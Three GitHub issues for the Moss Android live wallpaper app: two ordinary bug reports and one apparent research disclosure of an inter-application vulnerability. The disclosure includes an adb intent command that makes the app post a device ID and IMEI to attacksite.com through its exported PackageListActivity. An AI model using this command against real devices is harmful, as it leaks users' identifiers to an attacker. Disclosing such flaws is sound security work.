teneighty/moss,open,Unable to load custom mossrc,[],"In _Settings_ > _Overrides_ > _Custom File_, I can point to a custom config file at /sdcard/mossrc. Returning to _Set Wallpaper_, doesn't change anything, however, and the _Basic Configuration_ remains loaded. I tried _Settings_ > _Reload_ after pointing to the custom config but again the _Basic Configuration_ remains but without the overrides. 

Please let me know if there is something else that needs to be specified in order to load a custom config. 

Many thanks, Moss is an essential tool for those of us who constantly need to know what is going on! I use conky on my desktop.

teneighty/moss,open,Inter-application vulnerability,[],"Hi there,

This issue report is a part of a research. We have found that your application is vulnerable to inter-application communication. It can be replicated as follows:

adb shell 'am start ""intent://attacksite.com/post.php?deviceid=123&imei=0123#Intent;scheme=http;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;component=org.mosspaper/.PackageListActivity;end""'

By automating this, an attacking app that does not have INTERNET permission can post sensitive information to the attacker's website.

The problem is in PackageListActivity class where the ACTION of the coming Intent is checked in handleIntents() method and then internet is accessed on the URL in download() method of PackLoaderTask class which effectively lets an attacker to publish sensitive data to a given URL.

A given context is as follows: a malicious app without INTERNET permission but with other permissions (for example reading SMS) can use your application's INTERNET permission to pass sensitive data.

Can you please confirm this?

Thank you,
Biniam

teneighty/moss,open,Some indicators are not working,[],"Hi! Despite being using my current smartphone for nearly two years I have recently started to play with live wallpapers. Yours is simply awesome, thanks for your great work. However, in my particular case at least, some indicators are not working. CPU usage is shows always 0%, RAM amount is not the same shown in the system settings, Networking does not show any activity, and in the processes CPU usage shows NaN or Infinite. I'm aware that it could be my phone's fault, is a Sony Xperia Tipo. I attach a screenshot in case this helps.
